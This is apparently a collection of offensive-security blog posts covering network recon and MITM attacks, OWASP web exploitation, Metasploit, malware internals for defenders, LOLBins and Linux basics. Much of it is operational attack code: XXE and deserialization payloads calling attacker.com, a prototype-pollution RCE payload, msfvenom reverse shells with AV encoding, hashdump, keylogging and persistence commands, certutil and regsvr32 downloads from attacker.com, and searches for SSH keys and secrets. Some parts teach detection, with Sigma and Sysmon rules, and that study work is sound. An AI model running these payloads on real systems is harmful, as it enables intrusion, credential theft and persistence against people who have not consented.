nmap -6 -sv fe80::a00:27ff:fe4e:66a1%eth0
nmap -6 -sn 2001:db8::/32

# discover neighbours (replaces arp)
ip -6 neigh show

# router advertisement flood (fake ipv6 router — causes client misconfiguration)
thc-ipv6 fake_router6 eth0 2001:db8::/64

# rogue ra — redirect ipv6 traffic through attacker
# (can bypass ipv4-only firewall rules entirely)
fake_router26 eth0 dhcp — dynamic host configuration protocol **dhcp** automatically assigns ip addresses to hosts on a network. four-step process (dora): client  ──── dhcpdiscover (broadcast) ────────▶  (all servers)
server  ◀─── dhcpoffer ──────────────────────────
client  ──── dhcprequest (i'll take that offer) ▶
server  ◀─── dhcpack (confirmed) ──────────────── dhcp also delivers: subnet mask, default gateway, dns servers, domain name, ntp servers, wins servers.

**red team attacks:**
- **rogue dhcp** — spin up a fake dhcp server faster than the real one. set yourself as the default gateway or dns server → mitm all traffic on the segment
- **dhcp starvation** — flood with dhcpdiscover using spoofed macs, exhaust the ip pool, then bring up rogue dhcp
- **info gathering** — dhcp ack packets leak internal domain name, gateway, dns — capture with wireshark on a new connection red team network recon workflow put it all together. when you land on a network (fresh shell, new vpn, physical access), this is the mental model:

1. **where am i?** — get your ip, subnet, gateway, dns
2. **what's on this segment?** — arp scan, ping sweep, passive listening
3. **what segments exist?** — read the routing table, check for vlans
4. **what's reachable?** — port scan the live hosts
5. **what's interesting?** — identify services, grab banners, check for defaults # 1. where am i?
ip addr show
ip route show
cat /etc/resolv.conf
hostname -i

# windows equivalent
ipconfig /all
route print

# 2. passive — listen for traffic before making noise
tcpdump -i eth0 -nn -c 200 2>/dev/null   # see what's broadcasting/talking

# 3. host discovery — arp (lan) then icmp (routed)
arp-scan --localnet
nmap -sn 192.168.1.0/24                  # ping scan
nmap -sn 192.168.1.0/24 -pe -pp -ps21,22,80,443  # aggressive discovery

# 4. quick port scan on live hosts
nmap -t4 -f 192.168.1.0/24              # fast top-100 ports
nmap -t4 --open -p- 192.168.1.10       # all ports on single host

# 5. service/version scan on interesting hosts
nmap -sv -sc -p 22,80,443,445,3389 192.168.1.10

# 6. banner grabbing
nc -nv 192.168.1.10 80
openssl s_client -connect 192.168.1.10:443 2>/dev/null | head -20

# 7. check for common misconfigs
nmap --script smb-vuln* -p 445 192.168.1.0/24
nmap --script ftp-anon -p 21 192.168.1.0/24
nmap --script snmp-info -su -p 161 192.168.1.0/24 wireshark — reading the wire wireshark is the standard packet analyser. understanding packet captures ties together everything above — you see the actual handshakes, arp requests, dns queries, and plaintext credentials in real time.

**essential display filters:** **follow a stream:** right-click a packet → follow → tcp stream. reconstructs the full conversation as text — essential for reading http sessions, ftp commands, or anything plaintext. # capture all traffic on eth0
tcpdump -i eth0

# capture with full packet content (hex + ascii)
tcpdump -i eth0 -xx

# filter by host
tcpdump -i eth0 host 192.168.1.50

# filter by port
tcpdump -i eth0 port 80
tcpdump -i eth0 port 53

# capture syn packets only (new connections)
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# save to file, open in wireshark later
tcpdump -i eth0 -w capture.pcap

# read a pcap
tcpdump -r capture.pcap

# strip dns/arp noise and show only real traffic
tcpdump -i eth0 not arp and not port 53

# capture credentials from ftp / telnet / http
tcpdump -i eth0 -a -s0 port 21 or port 23 or port 80 | grep -ie 'user|pass|login|password' key takeaways **concepts to have cold:**

- osi layers 1–7 and where each attack class lives
- ipv4 binary → decimal conversion and subnet math without a calculator
- cidr prefix → number of hosts: `/24`=254, `/25`=126, `/26`=62, `/30`=2
- private ranges: `10/8`, `172.16/12`, `192.168/16`
- tcp three-way handshake and what each flag means
- arp is unauthenticated — always a mitm vector on a local segment
- default gateway is the escape hatch from the subnet — compromise it and you see everything
- vlans provide logical segmentation but can be hopped if dtp is enabled or native vlan is misconfigured
- ipv6 is enabled by default and often unmonitored — a parallel network to audit separately

**tools to know:**
`ipcalc`, `nmap`, `arp-scan`, `wireshark`, `tcpdump`, `bettercap`, `ip`, `traceroute`, `scapy`

networking fundamentals don't expire. the tcp/ip stack that existed in 1981 still underlies every http request, every reverse shell, every ldap query. building a solid mental model here makes every layer above it faster to learn and easier to break.

title: Web Application Hacking — The Modern OWASP Top 10 in Practice
summary: A practical attack walkthrough of current OWASP vulnerability classes with real payloads — IDOR, broken access control, SSRF, XXE, insecure deserialization, and
body:
web application hacking — the modern owasp top 10 in practice a practical attack walkthrough of current owasp vulnerability classes with real payloads — idor, broken access control, ssrf, xxe, insecure deserialization, and prototype pollution — focused on finding them in modern frameworks where the textbook payload doesn't fire. security web owasp idor ssrf deserialization prototype-pollution textbook payloads against a deliberately vulnerable training app teach the concept but not the job. modern frameworks add layers — orms, schema validation, auto-escaping templates — that block the naive version of every classic attack. this walkthrough focuses on the adjustment each one needs to actually fire against a real, modern stack. broken access control / idor modern apis increasingly use uuids instead of sequential integer ids specifically to defeat naive idor enumeration. that doesn't fix the underlying access-control gap — it just means you need a uuid belonging to another user before you can test the check, which you can usually get from a response that leaks one (a "recently viewed" list, an admin-facing endpoint, a webhook payload) rather than guessing it. get /api/orders/3f29a1c4-8e1b-4d2a-9c77-1a9b6e4f0d21 http/1.1
authorization: bearer <your_own_low_priv_token>
host: shop.example.com

# if this returns another user's order data using your token,
# the uuid was never the control -- the missing ownership check was also test the inverse direction modern apps frequently miss: **mass assignment via patch/put bodies**. a user-editable profile endpoint that blindly binds the request body to a model can let you set fields the ui never exposes — `role`, `isadmin`, `accounttier` — if the framework's serializer doesn't explicitly allowlist bindable fields. patch /api/users/me http/1.1
authorization: bearer <your_token>
content-type: application/json

{"name": "test user", "role": "admin", "isadmin": true} ssrf — past the naive filter most modern apps that accept a url parameter (webhook configuration, "import from url", pdf/screenshot generation) now run a basic blocklist against `localhost`, `127.0.0.1`, and `169.254.169.254`. none of the bypasses below are new techniques — they're the standard responses to that exact blocklist, and they still work because the blocklist is checking the string, not the resolved destination. even when the response body is filtered or generic, a blind ssrf candidate that takes measurably longer to respond when pointed at an internal-only address (versus a clearly external one) confirms the request is actually being made server-side — useful for proving impact even without a full response leak. xxe — when the parser looks hardened most current xml libraries disable external entity resolution by default, which kills the textbook `<!doctype foo [<!entity xxe system "file:///etc/passwd">]>` payload outright. two angles still work against a "hardened by default" parser: finding a secondary xml-consuming code path that uses an older library version or an explicit insecure configuration (svg upload handlers and saml assertion parsers are repeat offenders), and **error-based out-of-band exfiltration** when in-band entity expansion is blocked but dtd parsing itself isn't fully disabled. <?xml version="1.0"?>
<!doctype foo system "http://attacker.com/evil.dtd">
<foo>&xxe;</foo>

<!-- evil.dtd, hosted on attacker.com: -->
<!entity % file system "file:///etc/hostname">
<!entity % eval "<!entity % exfil system 'http://attacker.com/?d=%file;'>">
%eval;
%exfil; insecure deserialization — beyond `pickle.loads` the naive version of this finding is "the app calls `pickle.loads` on user input" — rare in production code anyone reviewed. the version that actually shows up: a framework's session mechanism, a caching layer, or a message queue payload silently round-trips a serialized object through the client, and a gadget chain in an already-loaded library (not anything the developers wrote) provides the rce primitive. # decode a suspicious cookie/parameter — java serialized objects start with this byte pattern
echo '<base64_blob>' | base64 -d | xxd | head -1
# ac ed 00 05 -- confirmed java serialization magic bytes

# generate a gadget chain matching a library already on the classpath
java -jar ysoserial.jar commonscollections6 'curl http://attacker.com/pwned' > payload.bin

# php equivalent -- generate against a known vulnerable class in the app's dependencies
phpggc laravel/rce13 system 'id' -b spend the time identifying *which* serialization library and *which* loaded classes are actually on the target's classpath before generating a gadget chain blind — `ysoserial`/`phpggc` both support dozens of chains, and firing the wrong one produces a silent failure indistinguishable from "not vulnerable" rather than useful signal. prototype pollution — the node.js-specific one prototype pollution is the modern-framework-specific entry on this list: a javascript object merge/clone utility (a vulnerable version of `lodash.merge`, a hand-rolled deep-merge for config objects, or a query-string parser that builds nested objects from bracket notation) lets an attacker set `__proto__` properties on the base `object.prototype`, which then propagate into *every object in the application* that doesn't explicitly own that property — turning a seemingly cosmetic config-merge bug into application-wide logic corruption or, in the right gadget, rce. get /api/search?__proto__[isadmin]=true&q=test http/1.1
host: app.example.com

# if a subsequent, unrelated request from the same session now
# behaves as if isadmin were true anywhere object defaults are read
# without an explicit own-property check, the pollution succeeded // if the app uses a template engine vulnerable to a known
// prototype-pollution-to-rce gadget (several exist for older
// ejs/pug/handlebars versions chained with a vulnerable merge):
{
  "__proto__": {
    "outputfunctionname": "x;process.mainmodule.require('child_process').execsync('id');x"
  }
} every one of these still works against a "modern, hardened" stack for the same underlying reason: **the framework's default protection covers the textbook case, not the actual data flow your specific application built on top of it.** uuids stop id guessing, not missing ownership checks. default xml parser settings stop the common payload, not a secondary code path on an older library. finding the gap between what the framework defends and what the application actually does with user input is the entire skill — payloads are the easy part once you've found that gap.

title: Metasploit – From Recon to Shell
summary: Metasploit is the most widely used exploitation framework. Learn msfconsole navigation, exploit and payload selection, Meterpreter post-exploitation, msfvenom p
body:
metasploit – from recon to shell metasploit is the most widely used exploitation framework. learn msfconsole navigation, exploit and payload selection, meterpreter post-exploitation, msfvenom payload crafting, and auxiliary scanning — from first launch to full shell. tools metasploit msfconsole msfvenom exploitation pentesting what is metasploit? **metasploit framework** is an open-source exploitation framework that provides a unified interface for finding, exploiting, and post-exploiting vulnerabilities. it ships with thousands of modules: the two most-used tools in the suite are **msfconsole** (interactive shell) and **msfvenom** (standalone payload generator). msfconsole – basic navigation # launch (with db support if postgresql is running)
msfconsole

# quiet launch (skip the banner)
msfconsole -q

# run a single command and exit
msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.5; set lport 4444; run'

# core commands inside msfconsole
help                  # show all commands
version               # framework version
search <term>         # search modules
use <module>          # select a module
info                  # show module details
show options          # show required/optional settings
show payloads         # payloads compatible with current exploit
set <opt> <value>     # set an option
unset <opt>           # clear an option
setg <opt> <value>    # set globally (persists across modules)
run / exploit         # run the module
back                  # leave current module
sessions              # list active sessions
sessions -i <id>      # interact with a session
jobs                  # list background jobs
kill <id>             # kill a job searching and selecting modules # search by cve
msf> search cve:2021-44228
msf> search cve:2017-0144

# search by name / platform
msf> search eternalblue
msf> search type:exploit platform:windows smb
msf> search type:auxiliary scanner ssh

# search by rank (excellent = most reliable)
msf> search rank:excellent type:exploit

# use a module by search result index or full path
msf> use 0
msf> use exploit/windows/smb/ms17_010_eternalblue

# show full module info (description, refs, reliability)
msf> info exploit/windows/smb/ms17_010_eternalblue

# check if a target is vulnerable before exploiting
msf exploit(ms17_010_eternalblue)> check standard exploit workflow # 1. select the exploit
msf> use exploit/windows/smb/ms17_010_eternalblue

# 2. review options
msf exploit(ms17_010_eternalblue)> show options

# 3. set target
msf exploit(ms17_010_eternalblue)> set rhosts 10.10.10.40
msf exploit(ms17_010_eternalblue)> set rport 445      # usually default

# 4. list compatible payloads
msf exploit(ms17_010_eternalblue)> show payloads

# 5. select payload
msf exploit(ms17_010_eternalblue)> set payload windows/x64/meterpreter/reverse_tcp

# 6. set payload options
msf exploit(ms17_010_eternalblue)> set lhost 10.10.14.5
msf exploit(ms17_010_eternalblue)> set lport 4444

# 7. run
msf exploit(ms17_010_eternalblue)> run

# run in background (keep msfconsole interactive)
msf exploit(ms17_010_eternalblue)> run -j payloads – staged vs stageless the `/` separator in payload names has a specific meaning: use **staged** when size matters (shellcode injection). use **stageless** when the delivery is a standalone file and reliability matters (av evasion, unstable networks).

common payload families: meterpreter – post-exploitation **meterpreter** runs entirely in memory, uses encrypted communication, and provides a rich api for post-exploitation. once you have a session: # basic situational awareness
meterpreter> sysinfo           # os, hostname, architecture
meterpreter> getuid            # current user
meterpreter> getpid            # current process id
meterpreter> ps                # list running processes
meterpreter> netstat           # network connections
meterpreter> ipconfig          # network interfaces

# filesystem
meterpreter> pwd               # current directory
meterpreter> ls                # list files
meterpreter> cd c:\\users
meterpreter> cat 'flag.txt'
meterpreter> download file.txt /tmp/
meterpreter> upload /tmp/tool.exe c:\\windows\\temp\\
meterpreter> search -f *.txt -d c:\\users  # find files

# shell access
meterpreter> shell             # drop to os shell (cmd.exe / bash)
meterpreter> execute -f cmd.exe -i -h   # hidden interactive shell

# privilege escalation
meterpreter> getsystem         # attempt automated privesc
meterpreter> getuid            # verify if system

# credential dumping
meterpreter> hashdump          # dump local sam hashes
meterpreter> run post/windows/gather/credentials/credential_collector

# pivoting
meterpreter> run post/multi/manage/shell_to_meterpreter
meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.5  # port forward rdp
meterpreter> run post/multi/manage/autoroute              # add pivot routes

# persistence
meterpreter> run post/windows/manage/persistence_exe startup=scheduler

# screenshot / keylogger
meterpreter> screenshot
meterpreter> keyscan_start
meterpreter> keyscan_dump
meterpreter> keyscan_stop auxiliary modules – scanning & brute-force # port scanner
msf> use auxiliary/scanner/portscan/tcp
msf> set rhosts 10.10.10.0/24
msf> set ports 22,80,443,445,3389
msf> run

# smb version scanner
msf> use auxiliary/scanner/smb/smb_version
msf> set rhosts 10.10.10.0/24
msf> run

# smb vulnerability check (ms17-010)
msf> use auxiliary/scanner/smb/smb_ms17_010
msf> set rhosts 10.10.10.40
msf> run

# ssh brute-force
msf> use auxiliary/scanner/ssh/ssh_login
msf> set rhosts 10.10.10.22
msf> set user_file /usr/share/wordlists/users.txt
msf> set pass_file /usr/share/wordlists/rockyou.txt
msf> set stop_on_success true
msf> run

# http directory scanner
msf> use auxiliary/scanner/http/dir_scanner
msf> set rhosts 10.10.10.10
msf> set rport 80
msf> run

# ftp anonymous login
msf> use auxiliary/scanner/ftp/anonymous
msf> set rhosts 10.10.10.0/24
msf> run

# snmp community string sweep
msf> use auxiliary/scanner/snmp/snmp_login
msf> set rhosts 10.10.10.0/24
msf> run msfvenom – standalone payload generation `msfvenom` generates payloads as files — executables, shellcode, scripts — for delivery outside of msfconsole. # list all payloads
msfvenom -l payloads

# list formats
msfvenom --list formats

# windows x64 reverse meterpreter exe
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  lhost=10.10.14.5 lport=4444 \
  -f exe -o shell.exe

# windows stageless (better for delivery)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  lhost=10.10.14.5 lport=4444 \
  -f exe -o shell_stageless.exe

# linux elf reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  lhost=10.10.14.5 lport=4444 \
  -f elf -o shell.elf && chmod +x shell.elf

# php webshell
msfvenom -p php/meterpreter/reverse_tcp \
  lhost=10.10.14.5 lport=4444 \
  -f raw -o shell.php

# python reverse shell
msfvenom -p python/meterpreter/reverse_tcp \
  lhost=10.10.14.5 lport=4444 \
  -f raw -o shell.py

# asp/aspx webshell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  lhost=10.10.14.5 lport=4444 \
  -f aspx -o shell.aspx

# raw shellcode (for injection)
msfvenom -p windows/x64/shell_reverse_tcp \
  lhost=10.10.14.5 lport=4444 \
  -f c          # c array
  -f py         # python bytes
  -f raw > shell.bin

# encode to bypass basic av
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  lhost=10.10.14.5 lport=4444 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o encoded.exe multi/handler – catching shells when you deliver a payload via msfvenom (or any other method), you need a listener to catch the connection. `multi/handler` is metasploit's universal listener. msf> use exploit/multi/handler
msf> set payload windows/x64/meterpreter/reverse_tcp
msf> set lhost 10.10.14.5
msf> set lport 4444
msf> set exitonsession false   # keep listener alive for multiple shells
msf> run -j                    # run as background job

# catch multiple sessions
msf> sessions                  # list all active sessions
msf> sessions -i 1             # interact with session 1
msf> sessions -u 1             # upgrade session 1 to meterpreter

# kill / background a session
meterpreter> background        # send session to background
meterpreter> exit              # close the session database integration # start postgresql and init the db (first time)
sudo systemctl start postgresql
msfdb init

# connect from msfconsole
msf> db_status

# import nmap scan results
msf> db_import /tmp/nmap_scan.xml

# run nmap directly and store results
msf> db_nmap -sv -sc -p- 10.10.10.40

# browse discovered hosts / services
msf> hosts
msf> services
msf> services -p 445           # filter by port
msf> vulns                     # show detected vulnerabilities

# export workspace
msf> workspace                 # list workspaces
msf> workspace -a htb_box      # create new workspace
msf> workspace htb_box         # switch workspace real-world use cases **internal penetration tests**
- run `db_nmap` to populate hosts/services, then use `vulns` to prioritise targets
- chain auxiliary scanners to identify weak credentials (ssh, smb, ftp, rdp) across a /24 before touching a single exploit
- use `multi/handler` with `exitonsession false` as a persistent listener for phishing payload callbacks
- post-exploitation: `run post/windows/gather/enum_domain` maps ad structure from a single compromised workstation

**red team operations**
- generate stageless https meterpreter payloads (`meterpreter_reverse_https`) for phishing — encrypted and blends with normal web traffic
- use `portfwd` and `autoroute` to pivot through a dmz host into the internal network without additional tooling
- `hashdump` → pass-the-hash with `psexec` module, or crack offline with hashcat ctf / htb workflow # step 1: recon with db
msf> workspace -a <box_name>
msf> db_nmap -sv -sc -p- <target_ip>
msf> services

# step 2: check for known exploits on discovered services
msf> search type:exploit name:eternalblue
msf> search type:exploit name:shellshock
msf> search cve:2021-3156     # sudo heap overflow (baron samedit)

# step 3: exploit + handler
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set rhosts <target_ip>
msf> set payload windows/x64/meterpreter/reverse_tcp
msf> set lhost tun0            # htb vpn interface
msf> run

# step 4: post-exploitation
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getsystem
meterpreter> hashdump
meterpreter> search -f user.txt -d c:\\
meterpreter> search -f root.txt -d c:\\

# step 5: if you get a shell, upgrade to meterpreter
msf> use post/multi/manage/shell_to_meterpreter
msf> set session 1
msf> run

# step 6: pivot to internal network
meterpreter> run post/multi/manage/autoroute
msf> use auxiliary/scanner/portscan/tcp
msf> set rhosts 172.16.0.0/24
msf> run - set `lhost tun0` on htb/tryhackme — this auto-resolves to your vpn ip
- `sessions -u <id>` upgrades a plain shell to meterpreter in one command
- if `getsystem` fails, run `run post/multi/recon/local_exploit_suggester` — it lists local privesc modules that match the target os
- for linux boxes: `run post/linux/gather/enum_system` grabs os info, cron jobs, suid binaries, and sudo rules in one go
- use `run -j` to background exploits; catch sessions with `sessions -i <id>` after they connect

**quick reference:**
```
msfconsole -q                        # quiet start
search cve:<year>-<id>               # find module by cve
set payload <tab>                    # tab-complete payloads
show missing                         # see which options are unset
run -j / sessions / sessions -i <n>  # background + interact
msfvenom -p <payload> lhost=<ip> lport=<port> -f <fmt> -o out
```

title: Malware Development for Defenders — Understanding What You're Detecting
summary: An introductory guide to malware internals, written for blue teamers: how a stager actually works, what shellcode injection looks like in memory, how C2 beaconi
body:
malware development for defenders — understanding what you're detecting an introductory guide to malware internals, written for blue teamers: how a stager actually works, what shellcode injection looks like in memory, how c2 beaconing is implemented under the hood, and why understanding the implementation makes your detection rules dramatically better. built entirely on open-source c2 frameworks as illustrative examples — no novel tooling. learn malware c2 shellcode blue-team detection-engineering you don't need to be able to write malware to detect it well — but understanding *how* the pieces work, mechanically, turns a detection rule from "matches this one sample" into "matches the technique, regardless of which sample uses it." this is the internals walkthrough aimed specifically at that goal, using open-source, publicly documented c2 frameworks (sliver, metasploit's meterpreter) as concrete reference points rather than abstract description. how a stager actually works a "stager" exists because the full malicious payload is often too large, too noisy, or too easily signatured to deliver in one shot via a phishing attachment or initial exploit. the stager is small and deliberately unremarkable — its only job is to fetch and load the real payload. 1. initial execution (macro, lnk, exploit) runs a small stager — often
   under a few hundred bytes of shellcode, or a short script
2. stager establishes outbound connectivity to a staging server
   (http/https get request is the most common transport)
3. stager receives the full payload (the actual implant) in the response body
4. stager allocates memory and transfers execution to the received payload
   -- the stager itself is now finished and often exits or is overwritten this is why a detection strategy built only around "block the malicious executable" misses so much: the executable that lands on disk, if anything ever does, is often the small, generic stager — indistinguishable on its own from a hundred other small downloaders. the interesting behaviour — the actual implant's capability — only exists in memory, fetched at runtime, after the file-based detection opportunity has already passed. shellcode injection — what it looks like in memory "shellcode injection" is a family of techniques for getting the implant's code running inside a process other than the one that delivered it — usually a long-lived, legitimate-looking process (`svchost.exe`, `explorer.exe`, a browser) chosen specifically because it won't draw attention and because it makes attributing the malicious activity to the actual delivery mechanism harder. the classic sequence, used by meterpreter's `migrate` and equivalent functionality in most frameworks, is three windows api calls used in combination: 1. openprocess()        -- get a handle to the target process
2. virtualallocex()     -- allocate a new memory region inside that
                            process, marked executable
3. writeprocessmemory()  -- write the shellcode bytes into that region
4. createremotethread() (or ntcreatethreadex / queueuserapc for
   variants that evade simpler detection) -- start execution of the
   newly written code, inside the target process's own context each of those four api calls is individually benign — legitimate software allocates remote memory and creates remote threads for entirely ordinary reasons. what's anomalous is the *combination and ordering*, especially when the calling process has no documented reason to be touching another process's memory at all (a word document's process calling `virtualallocex` against `explorer.exe` has no legitimate explanation). this is precisely the signal the yara rule in the infostealer cookie-theft post and most modern edr injection-detection logic are built around — the same four-call pattern, regardless of which specific malware family uses it. c2 beaconing — implementation, not just concept once the implant is running, it needs a way to receive operator commands without maintaining a permanently open connection (which would be trivially visible in any connection-monitoring tool). the standard solution is **beaconing**: the implant periodically reaches out to the c2 server on its own schedule, asks "any tasking for me?", executes whatever it receives, and reports results on the *next* check-in — rather than the server ever initiating contact. loop forever:
    sleep(interval +/- jitter)       # randomised delay defeats fixed-interval detection
    response = http_get(c2_server, disguised_as_legitimate_traffic)
    if response.has_tasking():
        result = execute(response.tasking)
        http_post(c2_server, encrypt(result))
    else:
        continue   # empty check-in, looks identical to a real one the two parameters that matter most for detection are **interval** and **jitter**. a fixed-interval beacon (exactly every 60 seconds, forever) is trivially flagged by any tool computing time-deltas between a host's outbound connections to the same destination. jitter — randomising each interval by some percentage — defeats naive fixed-interval detection, but doesn't defeat **statistical beacon detection**, which looks for outbound connections whose *inter-arrival time distribution* is unnaturally tight (low variance) even with jitter applied, because genuinely human-driven or application-driven traffic has a much messier timing distribution than anything jitter alone produces. import statistics

def looks_like_beaconing(connection_timestamps, destination):
    deltas = [
        t2 - t1 for t1, t2 in zip(connection_timestamps[:-1], connection_timestamps[1:])
    ]
    if len(deltas) < 10:
        return false
    mean_delta = statistics.mean(deltas)
    stdev_delta = statistics.pstdev(deltas)
    coefficient_of_variation = stdev_delta / mean_delta if mean_delta else 0
    # genuine human/application traffic to the same destination is messy;
    # beaconing -- even with jitter -- tends to stay unnaturally tight
    return coefficient_of_variation < 0.15 and len(deltas) > 20 why implementation knowledge makes detection rules better consider two versions of a detection rule for process injection. the first watches for a specific malware family's hash or specific named export — it stops working the moment the sample is recompiled. the second watches for the `openprocess` → `virtualallocex` → `writeprocessmemory` → `createremotethread` sequence, performed by a process with no legitimate reason to touch another process's memory, regardless of which family produced it. the second rule is only writable by someone who understands *why* that sequence exists and what's actually anomalous about it — not by someone who only knows "this sample is bad." title: suspicious cross-process memory write followed by remote thread creation
id: 4e7c91a0-2b3d-4f8e-9a61-7d3c5e8b0f12
status: stable
description: |
    detects the classic remote process injection api sequence
    (openprocess -> virtualallocex -> writeprocessmemory -> createremotethread)
    performed by a process with no documented legitimate need to write into
    another process's memory space.
tags:
    - attack.defense_evasion
    - attack.t1055
logsource:
    category: process_access
    product: windows
detection:
    selection:
        calltrace|contains:
            - 'virtualallocex'
            - 'writeprocessmemory'
            - 'createremotethread'
    filter_known_tools:
        image|endswith:
            - '\procexp.exe'
            - '\procexp64.exe'
    condition: selection and not filter_known_tools
falsepositives:
    - legitimate debuggers, some edr agents, and certain virtualization tools
level: high the fastest way to internalise this is to stand up a sliver or metasploit listener in an isolated lab vm, generate a basic stager, run it against a deliberately vulnerable target, and watch the resulting process tree and api calls in process monitor or your edr's own telemetry. reading about `virtualallocex` is useful; watching your own lab's edr console light up the exact moment a `createremotethread` call fires is what actually sticks. everything above describes publicly documented behaviour of open-source, widely-used red team frameworks (sliver, metasploit) for the explicit purpose of writing better detections against that behaviour. none of it is novel offensive capability — it's the same information already available in each project's own public documentation and a decade of conference talks on the subject. build and test against your own lab infrastructure only.

title: Living Off The Land Binaries — Attackers Using Your Own Tools Against You
summary: LOLBins are signed Microsoft binaries that attackers weaponise to download, execute, and persist — bypassing application whitelisting and AV. A comprehensive re
body:
living off the land binaries — attackers using your own tools against you lolbins are signed microsoft binaries that attackers weaponise to download, execute, and persist — bypassing application whitelisting and av. a comprehensive reference table of the most abused lolbins, what they do, and how to detect and restrict each one. tools lolbins red-team blue-team windows evasion detection defense-evasion living off the land (lotl) is one of the most effective evasion techniques available to an attacker — and one of the most painful for defenders to address. the concept is simple: instead of dropping custom malware that defenders can signature, use the tools already present on the target system. microsoft-signed. trusted by your av. allowed by your application whitelist. running under a legitimate process.

lolbins (living off the land binaries) are a subset of this: windows binaries already present on most systems that were not designed for malicious use but have been repeatedly abused to download code, execute payloads, bypass controls, or establish persistence.

the canonical reference is **lolbas project** (lolbas-project.github.io) — this post covers the most operationally significant entries with detection logic for each. most endpoint controls operate on reputation and signature. microsoft-signed binaries have the highest possible reputation. application whitelisting (applocker, wdac) typically allows all signed windows binaries by default. behavioural detections must be explicitly tuned to catch legitimate tools being misused — a much harder problem than catching known-malicious files. windows lolbins — execution & download windows lolbins — scripting & persistence windows lolbins — credential access & recon linux lolbins attack examples — common lolbin chains certutil download chain rem stage 1: certutil downloads the payload
certutil.exe -urlcache -split -f http://attacker.com/payload.exe c:\users\public\payload.exe

rem stage 2: execute
c:\users\public\payload.exe

rem variation: base64 decode to bypass content inspection
certutil.exe -urlcache -split -f http://attacker.com/payload.b64 c:\users\public\payload.b64
certutil.exe -decode c:\users\public\payload.b64 c:\users\public\payload.exe regsvr32 squiblydoo rem load remote com scriptlet via scrobj.dll — bypasses applocker
regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll

rem the sct file is xml containing a jscript/vbscript payload
rem <scriptlet><registration progid='test' classid='{...}'>
rem   <script language='jscript'>
rem     var r = new activexobject('wscript.shell');
rem     r.run('cmd.exe /c powershell -enc ...');
rem   </script>
rem </registration></scriptlet> wmic lateral movement rem execute process on remote host via wmic (requires valid credentials)
wmic /node:10.0.20.11 /user:domain\admin /password:password1 \
  process call create "powershell -enc base64payload"

rem why this is hard to detect:
rem - uses legitimate credentials
rem - process is spawned by wmiprvse.exe on target (looks legitimate)
rem - wmic traffic is encrypted over dce/rpc
rem - no file written to target (if payload is in-memory) detection and restriction strategy the goal is not to block all lolbins — many have legitimate uses. the goal is to **contextualise their execution**: who ran it, from what parent process, with what arguments, at what time. anomaly detection beats signature detection here. # windows defender attack surface reduction (asr) rules — block the most abused patterns
# requires defender atp / mde

# block office apps from creating child processes
add-mppreference -attacksurfacereductionrules_ids 'd4f940ab-401b-4efc-aadc-ad5f3c50688a' -attacksurfacereductionrules_actions enabled

# block process creations originating from psexec and wmi commands
add-mppreference -attacksurfacereductionrules_ids 'd1e49aac-8f56-4280-b9ba-993a6d77406c' -attacksurfacereductionrules_actions enabled

# block javascript or vbscript from launching downloaded executable content
add-mppreference -attacksurfacereductionrules_ids 'd3e037e1-3eb8-44c8-a917-57927947596d' -attacksurfacereductionrules_actions enabled

# block execution of potentially obfuscated scripts
add-mppreference -attacksurfacereductionrules_ids '5beb7efe-fd9a-4556-801d-275e5ffc04cc' -attacksurfacereductionrules_actions enabled

# applocker: block execution from user-writable paths (allow-list approach)
# start with audit mode — collect events before switching to enforce
new-applockerpolicy -ruletype path -user everyone -path '%temp%\*' -action deny # sysmon rule: detect certutil used as downloader
# add to sysmonconfig.xml eventfiltering section

<rulegroup name="certutil_abuse" grouprelation="or">
  <processcreate onmatch="include">
    <rule name="certutil downloader" grouprelation="and">
      <image condition="end with">certutil.exe</image>
      <commandline condition="contains any">-urlcache;-decode;-encode;-verifyctl</commandline>
    </rule>
  </processcreate>
</rulegroup> if you can only restrict a few, prioritise these because they offer the most attacker value with no legitimate daily-use case in most environments:
1. **cmstp.exe** — disable via applocker if your org does not use connection manager profiles
2. **mshta.exe** — block or monitor; almost never needed for business operations
3. **regsvr32.exe with /i:http** — asr rule exists specifically for this
4. **certutil.exe with -urlcache** — block the flag, not the binary (hashing is a legitimate use)
5. **wscript.exe / cscript.exe from email paths** — block execution from outlook attachment temp directories

title: Linux Fundamentals — The Complete Foundation
summary: Filesystem, permissions, users, processes, services, networking, bash, cron, logs, and a red team lens on every concept that matters in practice.
body:
linux fundamentals — the complete foundation filesystem, permissions, users, processes, services, networking, bash, cron, logs, and a red team lens on every concept that matters in practice. learn linux fundamentals bash permissions red-team privesc linux runs on the vast majority of servers, cloud infrastructure, embedded devices, and ctf targets you will ever encounter. whether you're reading log files after an incident, escalating privileges on a box, writing automation, or just administering a machine — you need a genuine understanding of how linux works, not just a list of commands to copy-paste.

this guide builds from the filesystem up. red team perspectives are embedded throughout — not because every operation is offensive, but because understanding *how attackers abuse things* is the fastest way to understand why they're designed the way they are. the filesystem hierarchy linux uses a single unified tree rooted at `/`. everything — files, devices, sockets, processes — is a file in this tree. there are no drive letters. **`/proc` is particularly powerful.** every running process has a directory `/proc/<pid>/` containing:
- `cmdline` — the exact command that launched it
- `environ` — its full environment variables (may contain secrets)
- `fd/` — file descriptors (open files, sockets, pipes)
- `maps` — memory map (loaded libraries, heap, stack)
- `status` — uid, gid, threads, memory stats

`/proc/self` always points to your own process. # where am i?
pwd

# list files (long format, hidden files, human sizes)
ls -lah
ls -lahr /etc/    # recursive

# navigate
cd /etc
cd ~              # home directory
cd -              # previous directory

# find files
find / -name "*.conf" 2>/dev/null
find /etc -type f -name "*.conf" 2>/dev/null
find / -name "id_rsa" 2>/dev/null          # find ssh private keys
find / -name "*.log" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null   # wordpress creds
find / -name ".env" 2>/dev/null            # dotenv secrets

# find recently modified files
find /etc -mmin -60 2>/dev/null            # modified in last 60 min
find / -newer /tmp/reference 2>/dev/null   # newer than a reference file

# read /proc for process info
